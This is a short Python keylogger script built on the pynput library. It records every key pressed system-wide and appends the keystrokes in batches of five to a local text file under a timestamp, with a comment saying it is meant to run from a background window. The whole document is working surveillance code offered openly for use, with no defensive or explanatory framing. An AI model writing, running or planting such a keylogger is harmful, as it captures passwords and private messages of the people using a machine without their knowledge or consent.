# Run from python window which is run from backgroud
from pynput.keyboard import  Key, Listener
from datetime import datetime

# Listener store the press key data
# key acess the keys

count = 0
keys=[]

with open("keylogger.txt", "a") as f :
    f.write("TimeStamp"+(str(datetime.now()))[:-7]+":\n")
    f.write("\n")
    
    
def on_press(key):
    global count, keys
    keys.append(key)
    count+=1
    if count >=5:
        count=0
        write_file(keys)
        keys=[]

    
def on_release(key):
    if key == Key.esc:
        return False
    

def write_file(keys):
    with open ("keylogger.txt", "a") as f:
        for idx, key in enumerate(keys):
            k = str(key).replace("'", "")
            if k.find("space") > 0 and k.find("backspace")==-1:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)
    
    
    
    
if __name__=="__main__":
    
    with Listener(on_press=on_press,on_release=on_release) as l:
        l.join()
        
    with open ("keylogger.txt", "a") as f:
        f.write("\n\n")
        f.write("------------------------------------------")
        f.write("\n\n")
    
